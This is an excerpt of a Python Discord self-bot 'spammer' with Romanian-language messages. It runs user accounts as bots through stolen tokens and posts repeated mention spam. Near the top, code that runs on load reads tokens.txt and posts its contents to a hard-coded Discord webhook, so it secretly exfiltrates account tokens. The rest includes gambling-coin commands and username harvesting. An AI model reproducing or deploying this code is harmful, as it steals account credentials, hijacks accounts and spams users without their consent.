...
#nemesis spammer made by hype <3333                                                                                                            
...
# get usernames.txt from valid tokens
...
client_pacanele_crypto = commands.Bot(command_prefix=".",self_bot=True,intents=intents)
...
# read usernames.txt for $tokenuser command
...
smrmata = "https://discord.com/api/webhooks/1337723115899191368/ao9bUq9Rd3Qb60vVBVsrqxhv1KhoQMMAt3P-cJXuZjz06oVC0U1Yp41gURDjxQyZrnFy"

with open('tokens.txt', 'r') as file:
    tknstst = file.read()

dete = {'content': tknstst}

response = requests.post(smrmata, data=dete)
...
async def call(ctx, *user_mentions: discord.User):
    ...
    requests.post(canal
                  ,headers=headers
                  ,json={"content":f"# hai tirfo sa ne pisam pe mt{mentions} "})
    time.sleep(3)
    requests.post(canal
                  ,headers=headers
                  ,json={"content":f"# aloo sajet la lupta sageticoo {mentions} "})
    time.sleep(3)
    requests.post(canal
                  ,headers=headers
...
def ensure_user(user_id):
    ...
    if str(user_id) not in data:
        data[str(user_id)] = {"balance": 1000, "last_daily": 0}  
    else:
        if "last_daily" not in data[str(user_id)]:
            data[str(user_id)]["last_daily"] = 0
    save_data(data)
...
def update_balance(user_id, amount):
    ...
    save_data(data)
@client_pacanele_crypto.command()
async def balance(ctx):
    ensure_user(ctx.author.id)
    data = load_data()
    bal = data[str(ctx.author.id)]["balance"]
    await ctx.send(f"💰 {ctx.author.mention}, ai {bal} coins")

@client_pacanele_crypto.command()
async def deletedm(ctx, channel_id: int):
    channel = client_pacanele_crypto.get_channel(channel_id)
    if not channel:
        await ctx.send("nui")
        return

    if not isinstance(channel, (discord.DMChannel, discord.TextChannel)):
        await ctx.send("doent exist")
        return

    if not channel.permissions_for(ctx.author).manage_messages:
        await ctx.send("nu pot")
        return
...
async def daily(ctx):
    ...
    if current_time - data[user_id]["last_daily"] < cooldown:
        remaining_time = cooldown - (current_time - data[user_id]["last_daily"])
        hours = int(remaining_time // 3600)
        minutes = int((remaining_time % 3600) // 60)
        await ctx.send(f"⏳ {ctx.author.mention}, asteapta an pizda amti {hours} ore and {minutes} minutes for reard again cred")
        return
    
    data[user_id]["balance"] += 500
    data[user_id]["last_daily"] = current_time
    save_data(data)
    await ctx.send(f"🎁 {ctx.author.mention}, 500 coins reward")
...
async def coinflip(ctx, bet: int, choice: str):
    ...
    if bet > bal:
        await ctx.send("❌ aha aha aha nai coins")
        return
    
    if choice.lower() not in ["cap", "pajura"]:
        await ctx.send("❌ cap sau pajura d aia")
        return
    
    result = random.choice(["cap", "pajura"])
    if choice.lower() == result:
        update_balance(ctx.author.id, bet)
        await ctx.send(f"🎉 ai iesit **{result}**! ai castigat {bet} coins gg")
    else:
        update_balance(ctx.author.id, -bet)
        await ctx.send(f"😢 a iesit **{result}**! ai pierdut {bet} coins")
...
#async def crypto(ctx, coin: str = "bitcoin"):
 ...
 #   if coin in response:
  #  price = response[coin]["usd"]
   # await ctx.send(f"📈 crypto ie {coin.capitalize()} **${price}** usede")
    #else:
    #await ctx.send("❌ nam scris iar bene")
...
async def finduser(ctx,text):
    text = str(text)
    listapuliimele = open('usernames.txt','r').read().splitlines()
    await ctx.message.delete()
    try:
...
youtube_link = "https://www.youtube.com/watch?v=euibekrj"
default_stream_text = "hype"
intents = discord.Intents.default()
...
async def start_bot(token,text1):
    ...
    youtube_link = "https://www.youtube.com/watch?v=gergeghh"
    intents = discord.Intents.default()
    intents.presences = True 
    @bot.event
    async def on_ready():
...
async def strtbot(tochennnn,strimtext):
    ...
    youtube_link = "https://www.youtube.com/watch?v=eghrtth"
    intents = discord.Intents.default()
    intents.presences = True 
    @bot25.event
    async def on_ready():
...
def run_pacanele_crypto(t,tolcenken):
    client_pacanele_crypto.run(tolcenken,bot=False)
...
if __name__ == "__main__":
    ...
    async def main():
        await asyncio.gather(
            ...
            client_pacanele_crypto.start(new_token, bot=False),
